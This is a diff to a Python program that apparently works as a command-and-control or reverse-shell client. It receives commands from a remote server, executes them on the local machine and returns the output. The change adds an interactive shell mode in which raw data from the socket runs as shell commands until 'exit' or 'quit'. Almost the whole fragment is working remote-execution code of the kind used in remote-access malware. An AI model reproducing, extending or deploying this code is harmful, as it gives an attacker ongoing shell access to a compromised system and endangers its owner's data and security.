@@ -21,17 +21,39 @@ def main():
 
     while True:
 
-        command = client.receive()
+        if client.interactive_shell:
+            data = client._ssock.recv(1024)
 
-        if command is None:
-            print("Server disconnected")
-            break
+            if not data:
+                print("Server disconnected")
+                break
 
-        print(f"Received command: {command}")
+            cmd = data.decode()
 
-        result = client.execute_command(command)
+            if cmd.strip().lower() in ["exit", "quit"]:
+                client.interactive_shell = False
+                client.send("[+] Exiting shell")
+                continue
 
-        client.send(result)
+            result = client.execute_command(f"shell {cmd}")
+            client.send(result if result else "")
+
+        else:
+            command = client.receive()
+
+            if command is None:
+                print("Server disconnected")
+                break
+
+            print(f"Received command: {command}")
+
+            if command.strip() == "shell":
+                client.interactive_shell = True
+                client.send("[+] Interactive shell started")
+                continue
+
+            result = client.execute_command(command)
+            client.send(result if result else "\n")
 
     client.close()
 
